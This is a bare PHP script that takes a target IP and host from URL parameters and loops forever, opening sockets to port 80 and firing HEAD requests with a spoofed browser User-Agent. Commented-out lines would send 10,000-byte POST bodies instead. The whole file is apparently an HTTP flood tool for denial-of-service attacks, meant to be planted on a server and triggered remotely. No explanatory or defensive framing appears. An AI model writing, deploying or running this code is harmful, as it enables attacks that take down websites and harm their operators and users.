$data = str_repeat("A", 10000);
echo 1;
$ip = $_GET['ip'];
$host = $_GET['host'];
$path = "/";
$post_data = 'data=' . $data;

while(1)
	{
	$filename = $ip.'.txt';

	if (file_exists($filename)) 
	{
		$ip = file_get_contents($filename);
	}
	$socket = fsockopen($ip, 80, $errno, $errstr, 15);
	$http = "HEAD {$path} HTTP/1.1\r\n";
	$http .= "Host: {$host}\r\n";
	$http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
	//$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
	//$http .= "Content-length: " . strlen($post_data) . "\r\n";
	$http .= "Connection: close\r\n\r\n";
	//$http .= $post_data . "\r\n";
	
	fwrite($socket, $http);
	
	#$contents = "";
	#while (!feof($socket)) {
	#	$contents.= fgets($socket, 4096);
	#}

	fclose($socket);
	}
